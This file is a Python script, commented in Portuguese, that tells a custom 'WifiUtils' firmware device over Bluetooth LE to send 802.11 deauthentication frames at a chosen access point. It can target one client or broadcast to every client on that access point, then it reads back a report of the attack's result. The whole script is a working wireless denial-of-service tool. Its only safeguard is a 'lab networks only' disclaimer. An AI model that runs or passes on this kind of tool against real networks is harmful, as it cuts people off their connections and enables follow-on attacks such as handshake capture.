#!/usr/bin/env python3
"""
Dispara um deauth contra um AP/cliente. Uso restrito a redes próprias
em ambiente de laboratório.

Uso:
    ~/.platformio/penv/bin/python scripts/deauth_test.py \\
        --bssid aa:bb:cc:dd:ee:ff \\
        --channel 6 \\
        [--target 11:22:33:44:55:66] \\
        [--count 30] \\
        [--reason 7]

Sem --target → broadcast (deauth todos os clients do AP).

O firmware ack'a com `started` em cmd_ctrl e, ao final, emite TLV
HACK_DEAUTH_DONE (0x20) em stream com sent/requested/channel/reason.
"""
import argparse
import asyncio
import json
import sys

from bleak import BleakClient, BleakScanner

SVC_UUID    = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c01"
CMD_UUID    = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c02"
STREAM_UUID = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c03"


async def find_target():
    print("→ scanning for WifiUtils-* device...")
    async with BleakScanner(service_uuids=[SVC_UUID]) as sc:
        await asyncio.sleep(5)
        for d in sc.discovered_devices:
            if (d.name or "").startswith("WifiUtils-"):
                return d
    return None


def decode_deauth_done(payload: bytes) -> dict:
    if len(payload) < 7:
        return {"_truncated": payload.hex()}
    return {
        "sent":      int.from_bytes(payload[0:2], "big"),
        "requested": int.from_bytes(payload[2:4], "big"),
        "channel":   payload[4],
        "reason":    int.from_bytes(payload[5:7], "big"),
    }


async def run(args):
    dev = await find_target()
    if not dev:
        print("✗ WifiUtils device not found"); sys.exit(2)
    print(f"→ connecting to {dev.address} ({dev.name})")

    async with BleakClient(dev) as client:
        done_evt = asyncio.Event()
        result = {}

        def cmd_cb(_h, data):
            print(f"← cmd: {data.decode('utf-8', errors='replace')}")

        def stream_cb(_h, data):
            if len(data) < 4:
                return
            mtype = data[2]
            payload = bytes(data[4:])
            if mtype == 0x20:
                result.update(decode_deauth_done(payload))
                print(f"← stream HACK_DEAUTH_DONE: {result}")
                done_evt.set()
            else:
                print(f"← stream type=0x{mtype:02x} ({len(payload)}B)")

        await client.start_notify(CMD_UUID, cmd_cb)
        await client.start_notify(STREAM_UUID, stream_cb)

        cmd = {
            "cmd": "deauth", "seq": 1,
            "bssid": args.bssid,
            "channel": args.channel,
            "count": args.count,
            "reason": args.reason,
        }
        if args.target:
            cmd["target"] = args.target

        payload = json.dumps(cmd)
        print(f"→ {payload}")
        await client.write_gatt_char(CMD_UUID, payload.encode("utf-8"), response=True)

        # Espera o TLV done (count=1000 leva ~3s, deixa margem)
        try:
            await asyncio.wait_for(done_evt.wait(), timeout=args.count * 0.005 + 5)
        except asyncio.TimeoutError:
            print("✗ timeout waiting HACK_DEAUTH_DONE")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Disparo de deauth via firmware WifiUtils. SOMENTE redes próprias.",
    )
    parser.add_argument("--bssid", required=True, help="BSSID do AP (aa:bb:cc:dd:ee:ff)")
    parser.add_argument("--channel", required=True, type=int, help="Canal do AP (1–14)")
    parser.add_argument("--target", help="MAC do cliente alvo (default: broadcast)")
    parser.add_argument("--count", type=int, default=30, help="Frames a enviar (default 30)")
    parser.add_argument("--reason", type=int, default=7, help="Reason code 802.11 (default 7)")
    args = parser.parse_args()

    asyncio.run(run(args))
